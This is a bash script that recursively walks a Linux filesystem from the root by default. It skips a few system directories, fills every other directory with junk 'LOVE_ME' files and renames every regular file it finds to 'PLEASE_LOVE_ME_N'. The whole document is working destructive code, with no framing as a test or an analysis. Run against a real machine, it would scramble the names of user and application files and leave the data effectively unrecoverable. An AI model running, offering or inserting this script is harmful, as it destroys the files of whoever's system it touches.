#!/bin/bash

# Absolute no-touch zones
SKIP_DIRS=(
    /proc /sys /run /dev
    /bin /sbin
    /lib /lib64
    /boot /tmp
    /usr          
    /etc          
    /etc/systemd /etc/init.d
)

should_skip() {
    local target="$1"
    # Strip trailing slash for clean comparison
    target="${target%/}"

    for skip in "${SKIP_DIRS[@]}"; do
        if [ "$target" = "$skip" ]; then
            return 0  # 0 = true in bash = skip this
        fi
    done
    return 1  # 1 = false in bash = don't skip
}

traverse() {
    local dir="$1"
    local depth="${2:-0}"
    local indent=$(printf '%*s' "$((depth * 2))" '')

    # echo "${indent}[DIR] $dir"

    for entry in "$dir"/*/; do
        [ -e "$entry" ] || continue

        entry="${entry%/}"  # strip trailing slash

        if should_skip "$entry"; then
            continue
        fi

        if [ -d "$entry" ]; then
            traverse "$entry" $((depth + 1))
            
            for i in {1..20}; do 
                touch "$entry/LOVE_ME_${i}"
            done

        fi
    done

    count=50
    for file in "$dir"/*; do
        [ -f "$file" ] || continue
        mv "$file" "$(dirname "$file")/PLEASE_LOVE_ME_${count}"
        ((count++))
    done
}

traverse "${1:-/}"